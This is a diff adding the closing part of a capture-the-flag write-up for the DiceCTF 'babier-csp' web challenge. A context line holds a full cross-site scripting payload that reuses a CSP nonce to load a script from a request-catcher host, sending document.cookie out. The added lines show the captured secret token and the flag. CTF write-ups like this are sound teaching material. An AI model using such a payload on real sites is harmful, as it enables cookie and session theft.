@@ -52,6 +52,35 @@ When the our new script tag is then executed, it want's to and is allowed to req
 Link: `https://babier-csp.dicec.tf?name=</h1><script nonce="LRGWAXOY98Es0zz0QOVmag==" >var head=document.getElementsByTagName('head')[0]; var script= document.createElement('script');script.src= ('https://givemeflag.requestcatcher.com/?flag='.concat(JSON.stringify(document.cookie)));script.nonce="LRGWAXOY98Es0zz0QOVmag==";head.appendChild(script);</script></h1>`
 
 The incoming request:
+![Request](https://github.com/the-lightstack/DiceCTF-Writeup/blob/main/request_catcher_request.png)
+
+So the GET request we caught 
+`GET /?flag=%22secret=4b36b1b8e47f761263796b1defd80745%22 HTTP/1.1`
+reveals "4b36b1b8e47f761263796b1defd80745" to be our token. 
+
+If we have a quick look into the index.js source code we could download from the diceCTF website, this part 
+
+```js
+app.use('/' + SECRET, express.static(__dirname + "/secret"));
+```
+reveals how to move on.
+Let's plug our token into the url like so `/4b36b1b8e47f761263796b1defd80745`
+
+The new pages source code:
+```
+
+I'm glad you made it here, there's a flag!
+
+<b>dice{web_1s_a_stat3_0f_grac3_857720}</b>
+
+If you want more CSP, you should try Adult CSP.
+
+```
+Hey!
+`dice{web_1s_a_stat3_0f_grac3_857720}` is our flag!
+
+Thanks for reading and hope you learned something new,
+LightStack
 
 
 
